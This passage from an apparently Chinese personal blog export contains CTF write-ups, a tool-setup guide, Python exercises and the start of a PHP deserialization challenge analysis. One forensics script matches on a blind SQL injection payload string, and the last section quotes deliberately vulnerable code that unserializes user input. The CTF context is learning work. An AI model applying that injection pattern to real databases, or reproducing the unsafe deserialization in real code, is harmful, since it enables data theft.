class="line">解压后长度比较大的文件的内容，最后都发现了一个数字，然后开头有jpg的文件头，先把这些文件都拉到一个文件夹里面，写一个脚本重命名一下文件，脚本如下</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------</span></span><br><span class="line"><span class="comment"># @Author  : M4XLMUM                                  </span></span><br><span class="line"><span class="comment"># @website : http://a16n.github.io or http://a16ne.cn </span></span><br><span class="line"><span class="comment"># -----------------------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件的位置，最后两个字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getchar</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.readlines()</span><br><span class="line">        value = content[<span class="built_in">len</span>(content)-<span class="number">1</span>][-<span class="number">1</span>:-<span class="number">3</span>:-<span class="number">1</span>][::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> value:</span><br><span class="line">            <span class="keyword">if</span> value[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> string.digits:</span><br><span class="line">                value = value[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cwd = os.getcwd()  <span class="comment"># cwd为文件的位置</span></span><br><span class="line">docs = os.listdir(cwd)</span><br><span class="line"><span class="keyword">for</span> doc <span class="keyword">in</span> docs:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(doc) &gt; <span class="number">10</span>:    <span class="comment"># 里面给的jpg的名字长度都是大于10的</span></span><br><span class="line">        os.rename(doc, getchar(doc)+<span class="string">&quot;.jpg&quot;</span>)</span><br></pre></td></tr></table></figure><p>用ps拼图，扫码。(终于拼好一次图片了啊)<br><img src="/2020/12/07/buuctf-misc//3.png" alt="二维码如下图所示"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASE Family Bucket ??? </span><br><span class="line">85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32</span><br></pre></td></tr></table></figure><p>flag.zip文件预览发现有加密后的内容，将加密后的内容按照上面加密的逆序解密即可(13代表的是rot13)<br><code>GNATOMJVIQZUKNJXGRCTGNRTGI3EMNZTGNBTKRJWGI2UIMRRGNBDEQZWGI3DKMSFGNCDMRJTII3TMNBQGM4TERRTGEZTOMRXGQYDGOBWGI2DCNBY</code><br><code>ThisIsSecret!233</code><br>解压文件得flag<br><code>flag&#123;Qr_Is_MeAn1nGfuL&#125;</code></p><h2 id="036-RoarCTF2019-黄金6年"><a href="#036-RoarCTF2019-黄金6年" class="headerlink" title="036.[RoarCTF2019]黄金6年"></a>036.[RoarCTF2019]黄金6年</h2><p><strong>TAG:</strong></p><p>给出的是一段视频，先看是不是视频里面藏的有二维码或者base64之类的，用pr打开一帧一帧地看。<br>在2:14和4:27和8:05处发现二维码，扫描<br>key1:i<br>key2:want<br>key3:play</p><h2 id="037-sqltest"><a href="#037-sqltest" class="headerlink" title="037.sqltest"></a>037.sqltest</h2><p><strong>TAG:python脚本， python切片，sql盲注流量分析</strong><br><strong>1.下载附件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网站遭受到攻击了，还好我们获取到了全部网络流量。 链接: https://pan.baidu.com/s/1AdQXVGKb6rkzqMLkSnGGBQ 提取码: 34uu</span><br><span class="line">写个脚本解决吧</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------</span></span><br><span class="line"><span class="comment"># @Author  : M4XLMUM                                  </span></span><br><span class="line"><span class="comment"># @website : http://a16n.github.io or http://a16ne.cn </span></span><br><span class="line"><span class="comment"># -----------------------------------------------------</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;sqltest.pcapng&quot;</span>, <span class="string">&quot;r&quot;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>).readlines()</span><br><span class="line">content = []</span><br><span class="line">content2 = []</span><br><span class="line">content3 = []</span><br><span class="line">content4 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;GET&#x27;</span> <span class="keyword">in</span> i <span class="keyword">and</span> <span class="string">&#x27;HTTP&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">        content.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">    pos_start = content[i].index(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    pos_end = <span class="built_in">len</span>(content[i])</span><br><span class="line">    content2.append(content[i][pos_start:pos_end-<span class="number">10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content2)):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ascii(substr(((select%20concat_ws(char(94),%20flag)&#x27;</span> <span class="keyword">in</span> content2[i]:</span><br><span class="line">        content3.append(<span class="built_in">int</span>(content2[i][::-<span class="number">1</span>][<span class="number">0</span>:content2[i][::-<span class="number">1</span>].index(<span class="string">&#x27;&gt;&#x27;</span>)][::-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(content3)):</span><br><span class="line">    <span class="keyword">if</span> content3[i] == <span class="number">100</span> <span class="keyword">and</span> content3[i+<span class="number">1</span>] != <span class="number">100</span> <span class="keyword">and</span> content3[i+<span class="number">1</span>] % <span class="number">50</span> == <span class="number">0</span>:</span><br><span class="line">        content4.append(content3[i-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">content4.append(content3[<span class="built_in">len</span>(content3)-<span class="number">1</span>]) <span class="comment"># 填上最后一位没特征的字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content4)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(content4[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;47edb8300ed5f9b28fc54b0d09ecdef7&#125;</span></span><br></pre></td></tr></table></figure><p>代码不是很难，emmm，没注释不知道读起来难不难hhh，by the way，python的切片功能太好使了吧。<br><code>flag&#123;47edb8300ed5f9b28fc54b0d09ecdef7&#125;</code></p><h2 id="038-ACTF新生赛2020-base64隐写"><a href="#038-ACTF新生赛2020-base64隐写" class="headerlink" title="038.[ACTF新生赛2020]base64隐写"></a>038.[ACTF新生赛2020]base64隐写</h2><p>base64隐写，直接上网上大哥哥们写好的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_stego</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ComeOn!.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="built_in">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += <span class="built_in">bin</span>(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="built_in">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">goflag</span>(<span class="params">bin_str</span>):</span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += <span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ACTF&#123;6aseb4_f33!&#125;</span></span><br></pre></td></tr></table></figure><p>得flag<br><code>flag&#123;6aseb4_f33!&#125;</code></p><h2 id="039-喵喵喵"><a href="#039-喵喵喵" class="headerlink" title="039.喵喵喵"></a>039.喵喵喵</h2><p>先lsb出来一张png，然后用winhex改下文件头和文件尾变成正常格式，然后扫码得到链接<code>https://pan.baidu.com/s/1pLT2J4f</code>，下载，ntfs数据流</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu搭建frp实现windows本地主机内网穿透</title>
      <link href="/2020/12/05/ubuntu%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0windows%E6%9C%AC%E5%9C%B0%E4%B8%BB%E6%9C%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>/2020/12/05/ubuntu%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0windows%E6%9C%AC%E5%9C%B0%E4%B8%BB%E6%9C%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="0-用到的链接"><a href="#0-用到的链接" class="headerlink" title="0.用到的链接"></a>0.用到的链接</h2><p><a href="https://zhuanlan.zhihu.com/p/262533456">知乎大哥</a></p><h1 id="0000-服务器端配置"><a href="#0000-服务器端配置" class="headerlink" title="0000 服务器端配置"></a>0000 服务器端配置</h1><h2 id="1-下载frp-server端文件"><a href="#1-下载frp-server端文件" class="headerlink" title="1.下载frp server端文件"></a>1.下载frp server端文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://github.com/fatedier/frp/releases/download/v0.34.0/frp_0.34.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><h2 id="2-解压缩"><a href="#2-解压缩" class="headerlink" title="2.解压缩"></a>2.解压缩</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zvxf frp_0.34.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><h2 id="3-复制到bin中"><a href="#3-复制到bin中" class="headerlink" title="3.复制到bin中"></a>3.复制到bin中</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp frpc /usr/bin/</span><br><span class="line">sudo cp frps /usr/bin/</span><br></pre></td></tr></table></figure><h2 id="4-复制配置文件-如果不是新安装则跳过这一步，不然会把旧配置覆盖掉"><a href="#4-复制配置文件-如果不是新安装则跳过这一步，不然会把旧配置覆盖掉" class="headerlink" title="4.复制配置文件 - 如果不是新安装则跳过这一步，不然会把旧配置覆盖掉"></a>4.复制配置文件 - 如果不是新安装则跳过这一步，不然会把旧配置覆盖掉</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /etc/frp/</span><br><span class="line">sudo cp frp*.ini /etc/frp/</span><br></pre></td></tr></table></figure><h2 id="5-启动frp服务"><a href="#5-启动frp服务" class="headerlink" title="5.启动frp服务"></a>5.启动frp服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo cp systemd/* /lib/systemd/system/</span><br><span class="line">sudo systemctl start frps # 云服务器启动这个</span><br><span class="line">sudo systemctl start frpc # 本地启动这个</span><br></pre></td></tr></table></figure><h2 id="PS1-修改云服务器端（Frps）配置"><a href="#PS1-修改云服务器端（Frps）配置" class="headerlink" title="PS1:修改云服务器端（Frps）配置"></a>PS1:修改云服务器端（Frps）配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/frp/frps.ini</span><br><span class="line">sudo systemctl restart frps</span><br></pre></td></tr></table></figure><h2 id="PS2-修改本地（Frpc）配置"><a href="#PS2-修改本地（Frpc）配置" class="headerlink" title="PS2:修改本地（Frpc）配置"></a>PS2:修改本地（Frpc）配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/frp/frpc.ini</span><br><span class="line">sudo systemctl restart frpc</span><br></pre></td></tr></table></figure><h2 id="PS3-开启日志"><a href="#PS3-开启日志" class="headerlink" title="PS3:开启日志"></a>PS3:开启日志</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line"># console or real logFile path like ./frps.log or ./frpc.log</span><br><span class="line">log_file = /tmp/frps.log</span><br><span class="line"># trace, debug, info, warn, error</span><br><span class="line">log_level = info</span><br><span class="line">log_max_days = 3</span><br></pre></td></tr></table></figure><h1 id="0001-客户端开始尝试"><a href="#0001-客户端开始尝试" class="headerlink" title="0001 客户端开始尝试"></a>0001 客户端开始尝试</h1><p>从给他github上面下载个frp的客户端，下amd64的那个。</p><p><del>还没调好，先放放吧，内网穿透本来用处也不大，除非你有个永远也不换关机的客户端，而这个客户端完全可以换成docker。等等再搞吧</del></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python基础练习</title>
      <link href="/2020/12/05/python%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/"/>
      <url>/2020/12/05/python%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><strong>前一段时间做过不长时间（差不多就一周吧）的算法题，现在忘得差不多了，再找个网站做一下吧</strong></p><p><a href="http://www.pythontip.com/coding/code_oj?page=1">PythonTip</a></p><blockquote><p>说明：我会将我的测试代码(就是给数据的那里)封下来，方便将来自己查看</p></blockquote><h2 id="1-a-b"><a href="#1-a-b" class="headerlink" title="1.a + b"></a>1.a + b</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Name:         a+b</span></span><br><span class="line"><span class="comment"># Description:  </span></span><br><span class="line"><span class="comment"># Author:       M4XLMUM</span></span><br><span class="line"><span class="comment"># Date:         2020/12/5</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a+b)</span><br></pre></td></tr></table></figure><h2 id="2-列表排序"><a href="#2-列表排序" class="headerlink" title="2.列表排序"></a>2.列表排序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Name:         2.列表排序</span></span><br><span class="line"><span class="comment"># Description:  </span></span><br><span class="line"><span class="comment"># Author:       M4XLMUM</span></span><br><span class="line"><span class="comment"># Date:         2020/12/5</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># data = [8, 7, 6, 5, 4, 3, 2, 1]</span></span><br><span class="line"><span class="comment"># data.sort()</span></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line">L.sort()</span><br><span class="line"><span class="built_in">print</span>(L)</span><br></pre></td></tr></table></figure><h2 id="3-第3题：字符串逆序"><a href="#3-第3题：字符串逆序" class="headerlink" title="3.第3题：字符串逆序"></a>3.第3题：字符串逆序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Name:         字符串逆序</span></span><br><span class="line"><span class="comment"># Description:  </span></span><br><span class="line"><span class="comment"># Author:       M4XLMUM</span></span><br><span class="line"><span class="comment"># Date:         2020/12/5</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># a = &#x27;xydz&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="4-输出字典key"><a href="#4-输出字典key" class="headerlink" title="4.输出字典key"></a>4.输出字典key</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Name:         输出字典key</span></span><br><span class="line"><span class="comment"># Description:  这一行就离谱嗷</span></span><br><span class="line"><span class="comment"># Author:       M4XLMUM</span></span><br><span class="line"><span class="comment"># Date:         2020/12/5</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># a = &#123;1: 1, 2: 2, 3: 3&#125;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, <span class="built_in">sorted</span>(a.keys()))))</span><br></pre></td></tr></table></figure><h2 id="5-第5题：输出字符奇数位置的字符串"><a href="#5-第5题：输出字符奇数位置的字符串" class="headerlink" title="5.第5题：输出字符奇数位置的字符串"></a>5.第5题：输出字符奇数位置的字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Name:         第5题：输出字符奇数位置的字符串</span></span><br><span class="line"><span class="comment"># Description:  </span></span><br><span class="line"><span class="comment"># Author:       M4XLMUM</span></span><br><span class="line"><span class="comment"># Date:         2020/12/5</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 题目描述：</span></span><br><span class="line"><span class="comment"># 给你一个字符串 a， 输出a中奇数位置字符构成的字符串（位置编号从1开始）。</span></span><br><span class="line"><span class="comment"># 例如：a=‘xyzwd’</span></span><br><span class="line"><span class="comment"># 则输出:xzd</span></span><br><span class="line"><span class="comment"># a = &#x27;01234567&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((<span class="built_in">len</span>(a)+<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(a[<span class="number">2</span>*i], end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 算法练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>装typecho</title>
      <link href="/2020/12/02/%E5%B0%86blog%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/12/02/%E5%B0%86blog%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>试一下typecho看看好备份不。<br><a href="http://yrclubs.com/archives/46/">照这个</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><strong>先拉个docker镜像</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 80x86/typecho</span><br></pre></td></tr></table></figure><p><strong>创建docker容器</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=typecho-blog --restart always -e PHP_TZ=Asia/Shanghai -e PHP_MAX_EXECUTION_TIME=600 -p 8081:80 80x86/typecho:latest</span><br></pre></td></tr></table></figure><p><strong>主题配置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /home/typecho/Typecho-Theme-RAW c507450f5c9f:/data/themes/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020-Easyphp</title>
      <link href="/2020/12/01/GYCTF2020-Easyphp/"/>
      <url>/2020/12/01/GYCTF2020-Easyphp/</url>
      
        <content type="html"><![CDATA[<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p><a href="http://www.zip源码,是反序列化,/">www.zip源码，是反序列化，</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>1.首先利用点在<code>update.php</code>文件里面，有个<code>$user-&gt;update()</code>的函数调用，然后进入<code>lib.php</code>文件。<br>2.下面为利用得到的部分代码，unserialize()反序列化了<code>this-&gt;getNewinfo()</code>，然后看这个方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Info</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getNewinfo</span>());</span><br><span class="line">        <span class="variable">$age</span>=<span class="variable">$Info</span>-&gt;age;</span><br><span class="line">        <span class="variable">$nickname</span>=<span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">        <span class="variable">$updateAction</span>=<span class="keyword">new</span> <span class="title class_">UpdateHelper</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>],<span class="variable">$Info</span>,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>3.下面是这个方法的内容，可以传入age与nickname，然后这里会对我们传入的值实例化一个Info对象，并进行safe()危险字符过滤，所以上面第二步反序列化的不是我们想要的，然后看safe()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$age</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">safe</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Info</span>(<span class="variable">$age</span>,<span class="variable">$nickname</span>)));</span><br><span class="line">    